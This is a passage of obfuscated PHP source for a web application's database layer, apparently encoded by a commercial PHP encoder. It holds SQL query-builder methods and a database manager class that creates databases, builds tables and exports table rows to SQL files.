= $‡“æ¥û[1057]; } foreach ($Íá²£Ó as $Ï”‰ê => $î¯À©—µ) { $ş³ƒ¨Şë .= $‡“æ¥û[338]; if (is_numeric($Ï”‰ê)) { $Ï”‰ê = $‡“æ¥û[1058]; } if (0 === strpos($Ï”‰ê, $‡“æ¥û[11])) { $ş³ƒ¨Şë .= $this->parseThinkWhere($Ï”‰ê, $î¯À©—µ); } else { if (!preg_match($‡“æ¥û[1059], trim($Ï”‰ê))) { think_exception(think_lang($‡“æ¥û[1060]) . $‡“æ¥û[4] . $Ï”‰ê); } $ÈØÖ˜ì° = is_array($î¯À©—µ) && isset($î¯À©—µ[$‡“æ¥û[1061]]); $Ï”‰ê = trim($Ï”‰ê); if (strpos($Ï”‰ê, $‡“æ¥û[215])) { $ğôß‘ñ§ = explode($‡“æ¥û[215], $Ï”‰ê); $Šõ¼ö£ş = array(); foreach ($ğôß‘ñ§ as $’°æ—‡Ò => $ÈÃß±Â) { $ò·Ç±± = $ÈØÖ˜ì° ? $î¯À©—µ[$’°æ—‡Ò] : $î¯À©—µ; $Šõ¼ö£ş[] = $‡“æ¥û[321] . $this->parseWhereItem($this->parseKey($ÈÃß±Â), $ò·Ç±±) . $‡“æ¥û[958]; } $ş³ƒ¨Şë .= implode($‡“æ¥û[1062], $Šõ¼ö£ş); } elseif (strpos($Ï”‰ê, $‡“æ¥û[344])) { $ğôß‘ñ§ = explode($‡“æ¥û[344], $Ï”‰ê); $Šõ¼ö£ş = array(); foreach ($ğôß‘ñ§ as $’°æ—‡Ò => $ÈÃß±Â) { $ò·Ç±± = $ÈØÖ˜ì° ? $î¯À©—µ[$’°æ—‡Ò] : $î¯À©—µ; $Šõ¼ö£ş[] = $‡“æ¥û[321] . $this->parseWhereItem($this->parseKey($ÈÃß±Â), $ò·Ç±±) . $‡“æ¥û[958]; } $ş³ƒ¨Şë .= implode($‡“æ¥û[1057], $Šõ¼ö£ş); } else { $ş³ƒ¨Şë .= $this->parseWhereItem($this->parseKey($Ï”‰ê), $î¯À©—µ); } } $ş³ƒ¨Şë .= $‡“æ¥û[339] . $ˆ¬ø¾Äì; } $ş³ƒ¨Şë = substr($ş³ƒ¨Şë, 0, -strlen($ˆ¬ø¾Äì)); } return empty($ş³ƒ¨Şë) ? $‡“æ¥û[12] : $‡“æ¥û[1063] . $ş³ƒ¨Şë; } protected function parseWhereItem($î¿§ğî„, $‡ïÃÈ¢) { $ Ë’ñ±° =& $_SERVER[Ñ¯©ç]; $ù‰á¹­é = $ Ë’ñ±°[12]; if (is_array($‡ïÃÈ¢)) { if (is_string($‡ïÃÈ¢[0])) { $“Õ«ñÍÉ = strtolower($‡ïÃÈ¢[0]); if (in_array($‡ïÃÈ¢[0], array($ Ë’ñ±°[937], $ Ë’ñ±°[1064], $ Ë’ñ±°[1065], $ Ë’ñ±°[1066], $ Ë’ñ±°[1067], $ Ë’ñ±°[1068]))) { $ù‰á¹­é .= $î¿§ğî„ . $ Ë’ñ±°[53] . $‡ïÃÈ¢[0] . $ Ë’ñ±°[53] . $this->parseValue($‡ïÃÈ¢[1]); } elseif (preg_match($ Ë’ñ±°[1069], $‡ïÃÈ¢[0])) { $ù‰á¹­é .= $î¿§ğî„ . $ Ë’ñ±°[53] . $this->exp[$“Õ«ñÍÉ] . $ Ë’ñ±°[53] . $this->parseValue($‡ïÃÈ¢[1]); } elseif (preg_match($ Ë’ñ±°[1070], $‡ïÃÈ¢[0])) { if (is_array($‡ïÃÈ¢[1])) { $§¾à¨¹ƒ = isset($‡ïÃÈ¢[2]) ? strtoupper($‡ïÃÈ¢[2]) : $ Ë’ñ±°[1055]; if (in_array($§¾à¨¹ƒ, array($ Ë’ñ±°[1054], $ Ë’ñ±°[1055], $ Ë’ñ±°[1056]))) { $†¯Ôû¤í = array(); foreach ($‡ïÃÈ¢[1] as $¬ŒéÀ¼) { $†¯Ôû¤í[] = $î¿§ğî„ . $ Ë’ñ±°[53] . $this->exp[$“Õ«ñÍÉ] . $ Ë’ñ±°[53] . $this->parseValue($¬ŒéÀ¼); } $ù‰á¹­é .= $ Ë’ñ±°[321] . implode($ Ë’ñ±°[53] . $§¾à¨¹ƒ . $ Ë’ñ±°[53], $†¯Ôû¤í) . $ Ë’ñ±°[958]; } } else { $ù‰á¹­é .= $î¿§ğî„ . $ Ë’ñ±°[53] . $this->exp[$“Õ«ñÍÉ] . $ Ë’ñ±°[53] . $this->parseValue($‡ïÃÈ¢[1]); } } elseif ($ Ë’ñ±°[357] == $“Õ«ñÍÉ) { $ù‰á¹­é .= $ Ë’ñ±°[956] . $î¿§ğî„ . $ Ë’ñ±°[53] . $‡ïÃÈ¢[1] . $ Ë’ñ±°[1071]; } elseif (preg_match($ Ë’ñ±°[1072], $‡ïÃÈ¢[0])) { $ù‰á¹­é .= $‡ïÃÈ¢[0]; } elseif (preg_match($ Ë’ñ±°[1073], $‡ïÃÈ¢[0])) { if (isset($‡ïÃÈ¢[2]) && $ Ë’ñ±°[357] == $‡ïÃÈ¢[2]) { $ù‰á¹­é .= $î¿§ğî„ . $ Ë’ñ±°[53] . $this->exp[$“Õ«ñÍÉ] . $ Ë’ñ±°[53] . $‡ïÃÈ¢[1]; } else { if (is_string($‡ïÃÈ¢[1])) { $‡ïÃÈ¢[1] = explode($ Ë’ñ±°[50], $‡ïÃÈ¢[1]); } $£âÂá— = implode($ Ë’ñ±°[50], $this->parseValue($‡ïÃÈ¢[1])); $ù‰á¹­é .= $î¿§ğî„ . $ Ë’ñ±°[53] . $this->exp[$“Õ«ñÍÉ] . $ Ë’ñ±°[956] . $£âÂá— . $ Ë’ñ±°[958]; } } elseif (preg_match($ Ë’ñ±°[1074], $‡ïÃÈ¢[0])) { $¬–­İºô = is_string($‡ïÃÈ¢[1]) ? explode($ Ë’ñ±°[50], $‡ïÃÈ¢[1]) : $‡ïÃÈ¢[1]; $ù‰á¹­é .= $ Ë’ñ±°[956] . $î¿§ğî„ . $ Ë’ñ±°[53] . $this->exp[$“Õ«ñÍÉ] . $ Ë’ñ±°[53] . $this->parseValue($¬–­İºô[0]) . $ Ë’ñ±°[1057] . $this->parseValue($¬–­İºô[1]) . $ Ë’ñ±°[339]; } else { think_exception(think_lang($ Ë’ñ±°[1060]) . $ Ë’ñ±°[4] . $‡ïÃÈ¢[0]); } } else { $®°†‘÷˜ = count($‡ïÃÈ¢); $İĞ¹ı § = $ Ë’ñ±°[12]; if (is_string($‡ïÃÈ¢[$®°†‘÷˜ - 1])) { $İĞ¹ı § = isset($‡ïÃÈ¢[$®°†‘÷˜ - 1]) ? strtoupper($‡ïÃÈ¢[$®°†‘÷˜ - 1]) : $ Ë’ñ±°[12]; if (in_array($İĞ¹ı §, array($ Ë’ñ±°[1054], $ Ë’ñ±°[1055], $ Ë’ñ±°[1056]))) { $®°†‘÷˜ = $®°†‘÷˜ - 1; } } else { $İĞ¹ı § = $ Ë’ñ±°[1054]; } for ($ÏºËîâÄ = 0; $ÏºËîâÄ < $®°†‘÷˜; $ÏºËîâÄ++) { $¬–­İºô = is_array($‡ïÃÈ¢[$ÏºËîâÄ]) ? $‡ïÃÈ¢[$ÏºËîâÄ][1] : $‡ïÃÈ¢[$ÏºËîâÄ]; if ($ Ë’ñ±°[357] == strtolower($‡ïÃÈ¢[$ÏºËîâÄ][0])) { $ù‰á¹­é .= $ Ë’ñ±°[321] . $î¿§ğî„ . $ Ë’ñ±°[53] . $¬–­İºô . $ Ë’ñ±°[1071] . $İĞ¹ı § . $ Ë’ñ±°[53]; } else { $Óœ²•º = is_array($‡ïÃÈ¢[$ÏºËîâÄ]) ? $this->exp[strtolower($‡ïÃÈ¢[$ÏºËîâÄ][0])] : $ Ë’ñ±°[937]; if (!$Óœ²•º && is_array($‡ïÃÈ¢[$ÏºËîâÄ]) && in_array($‡ïÃÈ¢[$ÏºËîâÄ][0], array($ Ë’ñ±°[937], $ Ë’ñ±°[1064], $ Ë’ñ±°[1065], $ Ë’ñ±°[1066], $ Ë’ñ±°[1067], $ Ë’ñ±°[1068]))) { $Óœ²•º = $‡ïÃÈ¢[$ÏºËîâÄ][0]; } $ù‰á¹­é .= $ Ë’ñ±°[321] . $î¿§ğî„ . $ Ë’ñ±°[53] . $Óœ²•º . $ Ë’ñ±°[53] . $this->parseValue($¬–­İºô) . $ Ë’ñ±°[1071] . $İĞ¹ı § . $ Ë’ñ±°[53]; } } $ù‰á¹­é = substr($ù‰á¹­é, 0, -4); } } else { $ù‰á¹­é .= $î¿§ğî„ . $ Ë’ñ±°[1075] . $this->parseValue($‡ïÃÈ¢); } return $ù‰á¹­é; } protected function parseThinkWhere($ÎÃøÈ¾, $±…Ë¥¶) { $üÖŠû‚‹ =& $_SERVER[Ñ¯©ç]; $ÂÊ¯û®â = $üÖŠû‚‹[12]; switch ($ÎÃøÈ¾) { case $üÖŠû‚‹[412]: $ÂÊ¯û®â = $±…Ë¥¶; break; case $üÖŠû‚‹[1058]: $ÂÊ¯û®â = is_string($±…Ë¥¶) ? $±…Ë¥¶ : substr($this->parseWhere($±…Ë¥¶), 6); break; case $üÖŠû‚‹[1076]: parse_str($±…Ë¥¶, $ÆíÎñù©); if (isset($ÆíÎñù©[$üÖŠû‚‹[1053]])) { $Í¡ıîûÎ = $üÖŠû‚‹[53] . strtoupper($ÆíÎñù©[$üÖŠû‚‹[1053]]) . $üÖŠû‚‹[53]; unset($ÆíÎñù©[$üÖŠû‚‹[1053]]); } else { $Í¡ıîûÎ = $üÖŠû‚‹[1057]; } $—±…İÆı = array(); foreach ($ÆíÎñù© as $˜ØÉ¤¯Ö => $ã¢ˆÚõ) { $—±…İÆı[] = $this->parseKey($˜ØÉ¤¯Ö) . $üÖŠû‚‹[1075] . $this->parseValue($ã¢ˆÚõ); } $ÂÊ¯û®â = implode($Í¡ıîûÎ, $—±…İÆı); break; } return $ÂÊ¯û®â; } protected function parseLimit($ìæÌİ²Õ) { $¾¿íÔÈ” =& $_SERVER[Ñ¯©ç]; return !empty($ìæÌİ²Õ) ? $¾¿íÔÈ”[51] . $ìæÌİ²Õ . $¾¿íÔÈ”[53] : $¾¿íÔÈ”[12]; } protected function parseJoin($´ÒÃ¢) { $¼Š•œë =& $_SERVER[Ñ¯©ç]; $¼¤ª•»Ä = $¼Š•œë[12]; if (!empty($´ÒÃ¢)) { if (is_array($´ÒÃ¢)) { foreach ($´ÒÃ¢ as $Şâ«û => $ÓÙíïæ©) { if (!1 !== stripos($ÓÙíïæ©, $¼Š•œë[1077])) { $¼¤ª•»Ä .= $¼Š•œë[53] . $ÓÙíïæ©; } else { $¼¤ª•»Ä .= $¼Š•œë[1078] . $ÓÙíïæ©; } } } else { $¼¤ª•»Ä .= $¼Š•œë[1078] . $´ÒÃ¢; } } $¼¤ª•»Ä = preg_replace($¼Š•œë[1079], think_config($¼Š•œë[983]) . $¼Š•œë[1080], $¼¤ª•»Ä); return $¼¤ª•»Ä; } protected function parseOrder($†Ÿ·âÏ×) { $÷£Ôİ×‹ =& $_SERVER[Ñ¯©ç]; if (is_array($†Ÿ·âÏ×)) { $å»Æ–‹è = array(); foreach ($†Ÿ·âÏ× as $©üúòÅÚ => $¥Ì­«î) { if (is_numeric($©üúòÅÚ)) { $å»Æ–‹è[] = $this->parseKey($¥Ì­«î); } else { $¥Ì­«î = in_array(strtoupper(trim($¥Ì­«î)), array($÷£Ôİ×‹[1081], $÷£Ôİ×‹[1082])) ? $÷£Ôİ×‹[53] . $¥Ì­«î : $÷£Ôİ×‹[12]; if (preg_match($÷£Ôİ×‹[1083], $©üúòÅÚ)) { $å»Æ–‹è[] = $this->parseKey($©üúòÅÚ) . $¥Ì­«î; } else { think_exception($÷£Ôİ×‹[1084] . $©üúòÅÚ); } } } $†Ÿ·âÏ× = implode($÷£Ôİ×‹[50], $å»Æ–‹è); } return !empty($†Ÿ·âÏ×) ? $÷£Ôİ×‹[1085] . $†Ÿ·âÏ× : $÷£Ôİ×‹[12]; } protected function parseGroup($ââ‡¿) { $‡óËÉ =& $_SERVER[Ñ¯©ç]; return !empty($ââ‡¿) ? $‡óËÉ[1086] . $ââ‡¿ : $‡óËÉ[12]; } protected function parseHaving($™×¢“ÈÎ) { $ñ±Áµ  =& $_SERVER[Ñ¯©ç]; return !empty($™×¢“ÈÎ) ? $ñ±Áµ [1087] . $™×¢“ÈÎ : $ñ±Áµ [12]; } protected function parseComment($Úïà×ÌÄ) { $‡ù‰‚Ğá =& $_SERVER[Ñ¯©ç]; return !empty($Úïà×ÌÄ) ? $‡ù‰‚Ğá[1088] . $Úïà×ÌÄ . $‡ù‰‚Ğá[1089] : $‡ù‰‚Ğá[12]; } protected function parseDistinct($µĞ¹¡¬™) { $ÓŞ½‘Á =& $_SERVER[Ñ¯©ç]; return !empty($µĞ¹¡¬™) ? $ÓŞ½‘Á[1090] : $ÓŞ½‘Á[12]; } protected function parseUnion($€Šµøéú) { $ıˆÛ’İ =& $_SERVER[Ñ¯©ç]; if (empty($€Šµøéú)) { return $ıˆÛ’İ[12]; } if (isset($€Šµøéú[$ıˆÛ’İ[408]])) { $Ü–øßä˜ = $ıˆÛ’İ[1091]; unset($€Šµøéú[$ıˆÛ’İ[408]]); } else { $Ü–øßä˜ = $ıˆÛ’İ[1092]; } foreach ($€Šµøéú as $Š­ú¸ş) { $ÛŠıÃå[] = $Ü–øßä˜ . (is_array($Š­ú¸ş) ? $this->buildSelectSql($Š­ú¸ş) : $Š­ú¸ş); } return implode($ıˆÛ’İ[53], $ÛŠıÃå); } public function insert($­ÛÙº±Ÿ, $£Ï¾á’· = array(), $ıŒê¹ßø = false) { $¾Ô§Ù˜ä =& $_SERVER[Ñ¯©ç]; $áÛªå— = $Œæú£ó = array(); $this->model = $£Ï¾á’·[$¾Ô§Ù˜ä[342]]; foreach ($­ÛÙº±Ÿ as $‘†áöËµ => $É‡£é÷æ) { if (is_array($É‡£é÷æ) && $¾Ô§Ù˜ä[357] == $É‡£é÷æ[0]) { $Œæú£ó[] = $this->parseKey($‘†áöËµ); $áÛªå—[] = $É‡£é÷æ[1]; } elseif (is_scalar($É‡£é÷æ) || is_null($É‡£é÷æ)) { $Œæú£ó[] = $this->parseKey($‘†áöËµ); $áÛªå—[] = $this->parseValue($É‡£é÷æ); } } $§ã¬À¥ = ($ıŒê¹ßø ? $¾Ô§Ù˜ä[960] : $¾Ô§Ù˜ä[961]) . $¾Ô§Ù˜ä[962] . $this->parseTable($£Ï¾á’·[$¾Ô§Ù˜ä[340]]) . $¾Ô§Ù˜ä[956] . implode($¾Ô§Ù˜ä[50], $Œæú£ó) . $¾Ô§Ù˜ä[957] . implode($¾Ô§Ù˜ä[50], $áÛªå—) . $¾Ô§Ù˜ä[958]; $§ã¬À¥ .= $this->parseLock(isset($£Ï¾á’·[$¾Ô§Ù˜ä[896]]) ? $£Ï¾á’·[$¾Ô§Ù˜ä[896]] : !1); $§ã¬À¥ .= $this->parseComment(!empty($£Ï¾á’·[$¾Ô§Ù˜ä[414]]) ? $£Ï¾á’·[$¾Ô§Ù˜ä[414]] : $¾Ô§Ù˜ä[12]); return $this->execute($§ã¬À¥, $this->parseBind(!empty($£Ï¾á’·[$¾Ô§Ù˜ä[345]]) ? $£Ï¾á’·[$¾Ô§Ù˜ä[345]] : array())); } public function selectInsert($ ÉÈÌš‚, $òûÛŞ ‰, $ü‡òÆ¿ñ = array()) { $Ã¢¥ê­ç =& $_SERVER[Ñ¯©ç]; $this->model = $ü‡òÆ¿ñ[$Ã¢¥ê­ç[342]]; if (is_string($ ÉÈÌš‚)) { $ ÉÈÌš‚ = explode($Ã¢¥ê­ç[50], $ ÉÈÌš‚); } array_walk($ ÉÈÌš‚, array($this, $Ã¢¥ê­ç[959])); $ğÀ›©é“ = $Ã¢¥ê­ç[1093] . $this->parseTable($òûÛŞ ‰) . $Ã¢¥ê­ç[956] . implode($Ã¢¥ê­ç[50], $ ÉÈÌš‚) . $Ã¢¥ê­ç[1071]; $ğÀ›©é“ .= $this->buildSelectSql($ü‡òÆ¿ñ); return $this->execute($ğÀ›©é“, $this->parseBind(!empty($ü‡òÆ¿ñ[$Ã¢¥ê­ç[345]]) ? $ü‡òÆ¿ñ[$Ã¢¥ê­ç[345]] : array())); } public function update($±‚Â»´Ø, $úå§Ş¾Ú) { $€›Şğ° =& $_SERVER[Ñ¯©ç]; $this->model = $úå§Ş¾Ú[$€›Şğ°[342]]; $‘º˜ğÌ = $€›Şğ°[1094] . $this->parseTable($úå§Ş¾Ú[$€›Şğ°[340]]) . $this->parseSet($±‚Â»´Ø) . $this->parseWhere(!empty($úå§Ş¾Ú[$€›Şğ°[336]]) ? $úå§Ş¾Ú[$€›Şğ°[336]] : $€›Şğ°[12]) . $this->parseOrder(!empty($úå§Ş¾Ú[$€›Şğ°[425]]) ? $úå§Ş¾Ú[$€›Şğ°[425]] : $€›Şğ°[12]) . $this->parseLimit(!empty($úå§Ş¾Ú[$€›Şğ°[352]]) ? $úå§Ş¾Ú[$€›Şğ°[352]] : $€›Şğ°[12]) . $this->parseLock(isset($úå§Ş¾Ú[$€›Şğ°[896]]) ? $úå§Ş¾Ú[$€›Şğ°[896]] : !1) . $this->parseComment(!empty($úå§Ş¾Ú[$€›Şğ°[414]]) ? $úå§Ş¾Ú[$€›Şğ°[414]] : $€›Şğ°[12]); return $this->execute($‘º˜ğÌ, $this->parseBind(!empty($úå§Ş¾Ú[$€›Şğ°[345]]) ? $úå§Ş¾Ú[$€›Şğ°[345]] : array())); } public function delete($ˆÌš•¥Ê = array()) { $³§®‡’Å =& $_SERVER[Ñ¯©ç]; $this->model = $ˆÌš•¥Ê[$³§®‡’Å[342]]; $ÁÙò¯”ì = $³§®‡’Å[1095] . $this->parseTable($ˆÌš•¥Ê[$³§®‡’Å[340]]) . $this->parseWhere(!empty($ˆÌš•¥Ê[$³§®‡’Å[336]]) ? $ˆÌš•¥Ê[$³§®‡’Å[336]] : $³§®‡’Å[12]) . $this->parseOrder(!empty($ˆÌš•¥Ê[$³§®‡’Å[425]]) ? $ˆÌš•¥Ê[$³§®‡’Å[425]] : $³§®‡’Å[12]) . $this->parseLimit(!empty($ˆÌš•¥Ê[$³§®‡’Å[352]]) ? $ˆÌš•¥Ê[$³§®‡’Å[352]] : $³§®‡’Å[12]) . $this->parseLock(isset($ˆÌš•¥Ê[$³§®‡’Å[896]]) ? $ˆÌš•¥Ê[$³§®‡’Å[896]] : !1) . $this->parseComment(!empty($ˆÌš•¥Ê[$³§®‡’Å[414]]) ? $ˆÌš•¥Ê[$³§®‡’Å[414]] : $³§®‡’Å[12]); return $this->execute($ÁÙò¯”ì, $this->parseBind(!empty($ˆÌš•¥Ê[$³§®‡’Å[345]]) ? $ˆÌš•¥Ê[$³§®‡’Å[345]] : array())); } public function select($úÁ¦òÈ¯ = array()) { $è•˜Æù =& $_SERVER[Ñ¯©ç]; $this->model = $úÁ¦òÈ¯[$è•˜Æù[342]]; $şìŸØßê = $this->buildSelectSql($úÁ¦òÈ¯); $³¡‰Éü‡ = isset($úÁ¦òÈ¯[$è•˜Æù[409]]) ? $úÁ¦òÈ¯[$è•˜Æù[409]] : !1; if ($³¡‰Éü‡) { $ÂÁŒÊ‡ = is_string($³¡‰Éü‡[$è•˜Æù[107]]) ? $³¡‰Éü‡[$è•˜Æù[107]] : $è•˜Æù[1096] . md5($şìŸØßê); $š”¨íâª = think_cache($ÂÁŒÊ‡, $è•˜Æù[12], $³¡‰Éü‡); if (!1 !== $š”¨íâª) { return $š”¨íâª; } } $©†ıñÌ = $this->query($şìŸØßê, $this->parseBind(!empty($úÁ¦òÈ¯[$è•˜Æù[345]]) ? $úÁ¦òÈ¯[$è•˜Æù[345]] : array())); if ($³¡‰Éü‡ && !1 !== $©†ıñÌ) { think_cache($ÂÁŒÊ‡, $©†ıñÌ, $³¡‰Éü‡); } return $©†ıñÌ; } public function buildSelectSql($Ê“Û = array()) { $İÙ×ÚúÔ =& $_SERVER[Ñ¯©ç]; if (isset($Ê“Û[$İÙ×ÚúÔ[413]])) { if (strpos($Ê“Û[$İÙ×ÚúÔ[413]], $İÙ×ÚúÔ[50])) { list($ÉÛÓŸó, $Šà©äì) = explode($İÙ×ÚúÔ[50], $Ê“Û[$İÙ×ÚúÔ[413]]); } else { $ÉÛÓŸó = $Ê“Û[$İÙ×ÚúÔ[413]]; } $ÉÛÓŸó = $ÉÛÓŸó ? $ÉÛÓŸó : 1; $Šà©äì = isset($Šà©äì) ? $Šà©äì : (is_numeric($Ê“Û[$İÙ×ÚúÔ[352]]) ? $Ê“Û[$İÙ×ÚúÔ[352]] : 20); $÷ÆÙ‰÷½ = $Šà©äì * ((int) $ÉÛÓŸó - 1); $Ê“Û[$İÙ×ÚúÔ[352]] = $÷ÆÙ‰÷½ . $İÙ×ÚúÔ[50] . $Šà©äì; } if (think_config($İÙ×ÚúÔ[1097])) { $ÍÕĞÜ– = $İÙ×ÚúÔ[1098] . md5(serialize($Ê“Û)); $•ôÄ×áö = think_cache($ÍÕĞÜ–); if ($•ôÄ×áö) { return $•ôÄ×áö; } } $¨Ò•¶óÓ = $this->parseSql($this->selectSql, $Ê“Û); $¨Ò•¶óÓ .= $this->parseLock(isset($Ê“Û[$İÙ×ÚúÔ[896]]) ? $Ê“Û[$İÙ×ÚúÔ[896]] : !1); if (isset($ÍÕĞÜ–)) { think_cache($ÍÕĞÜ–, $¨Ò•¶óÓ); } return $¨Ò•¶óÓ; } public function parseSql($‹ÅÀ‚ã, $»…Ç¹™ë = array()) { $”¡ıÕ› =& $_SERVER[Ñ¯©ç]; $‹ÅÀ‚ã = str_replace(array($”¡ıÕ›[1099], $”¡ıÕ›[1100], $”¡ıÕ›[1101], $”¡ıÕ›[1102], $”¡ıÕ›[1103], $”¡ıÕ›[1104], $”¡ıÕ›[1105], $”¡ıÕ›[1106], $”¡ıÕ›[1107], $”¡ıÕ›[1108], $”¡ıÕ›[1109]), array($this->parseTable("{$»…Ç¹™ë[$”¡ıÕ›[340]]}"), $this->parseDistinct(isset($»…Ç¹™ë[$”¡ıÕ›[1110]]) ? $»…Ç¹™ë[$”¡ıÕ›[1110]] : !1), $this->parseField(!empty($»…Ç¹™ë[$”¡ıÕ›[334]]) ? $»…Ç¹™ë[$”¡ıÕ›[334]] : $”¡ıÕ›[221]), $this->parseJoin(!empty($»…Ç¹™ë[$”¡ıÕ›[343]]) ? $»…Ç¹™ë[$”¡ıÕ›[343]] : $”¡ıÕ›[12]), $this->parseWhere(!empty($»…Ç¹™ë[$”¡ıÕ›[336]]) ? $»…Ç¹™ë[$”¡ıÕ›[336]] : $”¡ıÕ›[12]), $this->parseGroup(!empty($»…Ç¹™ë[$”¡ıÕ›[562]]) ? $»…Ç¹™ë[$”¡ıÕ›[562]] : $”¡ıÕ›[12]), $this->parseHaving(!empty($»…Ç¹™ë[$”¡ıÕ›[1111]]) ? $»…Ç¹™ë[$”¡ıÕ›[1111]] : $”¡ıÕ›[12]), $this->parseOrder(!empty($»…Ç¹™ë[$”¡ıÕ›[425]]) ? $»…Ç¹™ë[$”¡ıÕ›[425]] : $”¡ıÕ›[12]), $this->parseLimit(!empty($»…Ç¹™ë[$”¡ıÕ›[352]]) ? $»…Ç¹™ë[$”¡ıÕ›[352]] : $”¡ıÕ›[12]), $this->parseUnion(!empty($»…Ç¹™ë[$”¡ıÕ›[407]]) ? $»…Ç¹™ë[$”¡ıÕ›[407]] : $”¡ıÕ›[12]), $this->parseComment(!empty($»…Ç¹™ë[$”¡ıÕ›[414]]) ? $»…Ç¹™ë[$”¡ıÕ›[414]] : $”¡ıÕ›[12])), $‹ÅÀ‚ã); return $‹ÅÀ‚ã; } public function getLastSql($•¡š¦‚ = '') { return $•¡š¦‚ ? $this->modelSql[$•¡š¦‚] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Ö‰ãÈéÛ) { return addslashes($Ö‰ãÈéÛ); } public function setModel($Æ¯°Âüë) { $this->model = $Æ¯°Âüë; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($÷àšÔëâ = array()) { $¹×ºœ¯Ó =& $_SERVER[Ñ¯©ç]; if (empty($÷àšÔëâ)) { $÷àšÔëâ = $GLOBALS[$¹×ºœ¯Ó[6]][$¹×ºœ¯Ó[21]]; } $this->database = $÷àšÔëâ; } public function model($Ù¶ıäİº = '') { return new ModelBase($Ù¶ıäİº, $_SERVER[Ñ¯©ç][12], $this->database); } public function db($Å”ûüì¦ = false) { $¯Æ®Íà =& $_SERVER[Ñ¯©ç]; $ú×ÜÕ° = array_change_key_case($this->database); if ($this->dbType() == $¯Æ®Íà[13] || !$Å”ûüì¦) { return $this->model()->db(); } $ò¶ì£é = $ú×ÜÕ°[$¯Æ®Íà[1025]]; $ú×ÜÕ°[$¯Æ®Íà[1025]] = $¯Æ®Íà[12]; if ($ú×ÜÕ°[$¯Æ®Íà[1020]] == $¯Æ®Íà[1017]) { $åæÜÖÑ = $ú×ÜÕ°[$¯Æ®Íà[1026]]; $ú×ÜÕ°[$¯Æ®Íà[1026]] = substr($åæÜÖÑ, 0, strrpos($åæÜÖÑ, $¯Æ®Íà[1112])); } $this->database = $ú×ÜÕ°; $Ë£Ä¤¼¡ = $this->model()->db(); try { $ŞüíàÅ = $Ë£Ä¤¼¡->execute("\x73\x68\157\167\40\x64\x61\164\x61\142\x61\163\x65\163\x20\x6c\x69\153\145\40\47{$ò¶ì£é}\47"); } catch (Exception $Ê£ÜÌ©§) { } if (!$ŞüíàÅ) { $Ë£Ä¤¼¡->execute("\x63\162\145\x61\164\x65\x20\x64\141\x74\141\x62\141\163\145\x20\x60{$ò¶ì£é}\x60"); } $ú×ÜÕ°[$¯Æ®Íà[1025]] = $ò¶ì£é; if ($ú×ÜÕ°[$¯Æ®Íà[1020]] == $¯Æ®Íà[1017]) { $ú×ÜÕ°[$¯Æ®Íà[1026]] .= $¯Æ®Íà[1112] . $ò¶ì£é; } $this->database = $ú×ÜÕ°; $Ë£Ä¤¼¡->execute("\165\x73\x65\40\x60{$ò¶ì£é}\x60"); return $Ë£Ä¤¼¡; } public function createTable($ÙÓ»‡Š”, &$Õ£¾È™Ä) { $·ó¦Î =& $_SERVER[Ñ¯©ç]; if (!IO::exist($ÙÓ»‡Š”)) { ActionCall($·ó¦Î[1113], !0, 0); show_json(LNG($·ó¦Î[1114]), !1); } $ çÛâãä = $this->model()->db(); $’á»êœÊ = sqlSplit(IO::getContent($ÙÓ»‡Š”)); foreach ($’á»êœÊ as $Øç©ÍÄó) { $üÒşŸª = stripos($Øç©ÍÄó, $·ó¦Î[1115]) === 0; if ($üÒşŸª) { $Õ£¾È™Ä->task[$·ó¦Î[1116]] += 1; } $ çÛâãä->execute($Øç©ÍÄó); if ($üÒşŸª) { preg_match($·ó¦Î[1117], $Øç©ÍÄó, $â–³×å); $Õ£¾È™Ä->task[$·ó¦Î[1118]] = $â–³×å[1]; $Õ£¾È™Ä->update(1); } } } public function insertTable($ıÀ§å, &$»ö¾úÒ) { $ÎŞú÷¸Ü =& $_SERVER[Ñ¯©ç]; $»ËÑµø = $this->model()->db(); $‚³»ÒÇ¼ = $°š‡Ìé ? array($°š‡Ìé) : $»ËÑµø->getTables(); foreach ($ıÀ§å as $»ğ¨À) { $°š‡Ìé = basename($»ğ¨À, $ÎŞú÷¸Ü[840]); if (!in_array($°š‡Ìé, $‚³»ÒÇ¼)) { continue; } $»ö¾úÒ->task[$ÎŞú÷¸Ü[1118]] = $°š‡Ìé; if (get_filesize($»ğ¨À) == 0) { continue; } $È—›ÁÅ = $this->sqlToDb($»ğ¨À, $»ö¾úÒ); if (!$È—›ÁÅ) { ActionCall($ÎŞú÷¸Ü[1113], !0, 0); show_json(LNG($ÎŞú÷¸Ü[1119]) . "\133{$°š‡Ìé}\x5d", !1); } } } public function sqlFromDb($ÚŠÆ¬Ÿ, $ö°ØìÇ, &$Üá«ë³ó, $É°î—™ = '') { if ($Üá«ë³ó) { $Üá«ë³ó->task[$_SERVER[Ñ¯©ç][1118]] = $ÚŠÆ¬Ÿ; } $Æ–¢ñÅã = $this->model($ÚŠÆ¬Ÿ); $×Ñê×ªê = 0; $¤µÙßô¿ = 0; $ç“Ç ğÓ = 10000; $ğÙ ÒßÇ = fopen($ö°ØìÇ, $_SERVER[Ñ¯©ç][1120]); $ğÔšõ§ = $Æ–¢ñÅã->getPk(); $ÇéáÍÖŞ = $Æ–¢ñÅã->getDbFields(); $´‰•Åƒˆ = $_SERVER[Ñ¯©ç][12]; if ($GLOBALS[$_SERVER[Ñ¯©ç][839]] && in_array($ÚŠÆ¬Ÿ, array($_SERVER[Ñ¯©ç][1121], $_SERVER[Ñ¯©ç][1122]))) { $´‰•Åƒˆ = $ÚŠÆ¬Ÿ; } do { $æÄÂ‹Ï§ = array($ğÔšõ§ => array($_SERVER[Ñ¯©ç][1067], $¤µÙßô¿)); $ÈÙíğ‰ = $Æ–¢ñÅã->where($æÄÂ‹Ï§)->field($ÇéáÍÖŞ)->order($ğÔšõ§ . $_SERVER[Ñ¯©ç][1123])->limit($ç“Ç ğÓ)->select(); $ÈÙíğ‰ = !empty($ÈÙíğ‰) ? $ÈÙíğ‰ : array(); if (!($’æ¹‰×ş = count($ÈÙíğ‰))) { break; } $ñ¢Ë¡Ê± = end($ÈÙíğ‰); $¤µÙßô¿ = $ñ¢Ë¡Ê±[$ğÔšõ§]; $¦†º†£Ï = array(); foreach ($ÈÙíğ‰ as $Ú„úì¬¤) { if ($´‰•Åƒˆ) { if ($ÚŠÆ¬Ÿ == $_SERVER[Ñ¯©ç][1121]) { if 